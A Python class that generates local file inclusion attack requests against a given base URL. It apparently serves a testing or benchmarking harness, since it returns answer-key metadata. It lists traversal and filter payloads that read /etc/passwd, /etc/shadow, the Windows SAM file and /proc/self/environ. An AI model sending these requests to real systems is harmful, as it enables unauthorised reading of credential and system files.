import random
from typing import Dict, Tuple
from .base import BaseAttack

class LFIAttack(BaseAttack):
    PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "/etc/shadow",
        "../../../../etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/var/log/apache2/access.log"
    ]

    ENDPOINTS = [
        "/view",
        "/download",
        "/include",
        "/api/file"
    ]

    def generate(self, base_url: str) -> Tuple[Dict, Dict]:
        """
        Generates a Local File Inclusion (LFI) attack configuration.
        Returns: (request_kwargs, answer_key_metadata)
        """
        payload = random.choice(self.PAYLOADS)
        endpoint = random.choice(self.ENDPOINTS)
        url = f"{base_url}{endpoint}"
        
        # LFI attacks are typically via GET query params
        request_kwargs = {
            "method": "GET",
            "url": url,
            "params": {"file": payload}
        }

        metadata = {
            "type": "LFI",
            "endpoint": endpoint,
            "payload": payload,
            "method": "GET"
        }
        
        return request_kwargs, metadata
